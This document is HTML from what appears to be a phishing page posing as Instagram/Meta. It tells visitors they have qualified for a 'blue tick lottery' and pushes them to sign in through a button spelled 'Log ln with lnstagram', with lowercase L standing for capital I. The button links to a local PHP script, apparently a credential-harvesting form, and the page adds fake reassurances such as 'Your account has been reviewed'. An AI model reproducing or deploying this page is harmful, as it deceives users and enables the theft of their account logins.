  ...
  <nav>
        ...
        <div class="nav-main">
            <div class="nav-logo">
                ...
                <a href="https://instagram.com">Meta</a>
        ...
        <section class="section-1">
            <div class="section-1-main">
                <div class="section-1-content">
                    ...
                    <h1 class="section-1-title">You have a chance to get a Blue Tick</h1>
                    <p class="section-1-desc">You have qualified to enter the blue tick lottery. We give a Blue Tick to one of 10 users with a lottery. Sign in to confirm it's you.</p>
                    <div class="section-1-links">
                        <a href="i-multistepigardo.php" class="section-1-link">Log ln with lnstagram ➜</a>
                        
                    </div>
                    <ul class="section-1-lists">
                        <li><img src="i-img/i-verify.svg" alt=""> <span>Your account has been reviewed</span></li>
                        <li><img src="i-img/i-verify.svg" alt=""> <span>You are eligible to be our partner</span></li>
                    </ul>
                </div>
                <div class="section-1-img">
                    <img src="i-img/i-wall.png" alt="" style="width: 100%;">
                </div>
            </div>
        </section>
            ...
            <div class="section-2-main">
                ...
                <div class="section-2-2">
                    <div class="section-2-2-content">
                        ...
                        <p class="section-2-2-desc">You are very close to becoming our partner and getting your Verified badge. Join the endless world of verified badges.</p>
                        <a href="i-multistepigardo.php" class="section-2-2-link">Continue ➜</a>
                    </div>
    ...
    <footer>
        <div class="footer-main">
            <div class="footer-content">
                <div class="footer-1">
                    <a href="https://instagram.com/" class="footer-1-logo">Meta</a>
